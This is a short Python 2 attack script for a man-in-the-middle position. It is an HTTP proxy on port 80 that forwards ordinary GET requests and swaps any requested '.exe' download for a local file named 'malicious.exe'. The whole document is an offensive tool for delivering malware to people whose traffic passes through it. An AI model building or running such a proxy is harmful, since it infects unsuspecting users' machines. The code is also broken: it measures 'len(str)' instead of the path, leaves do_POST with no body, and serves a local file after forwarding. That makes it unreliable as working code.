# inline file swapper for web MITM

import SocketServer
import SimpleHTTPServer
import urllib

PORT = 80

class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        # manages swapping exe files
        if self.path[(len(str))-3:] == "exe":
          self.path="/malicious.exe"
        # extremely simple forwarder
        # fails in all but simple GETs
        else:
            urlhandle = urllib.urlopen(self.path)
            self.wfile.write(urlhandle.read())
        return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
    def do_POST(self):
        # TODO


httpd = SocketServer.ForkingTCPServer(('', PORT), Proxy)
print "serving at port", PORT
httpd.serve_forever()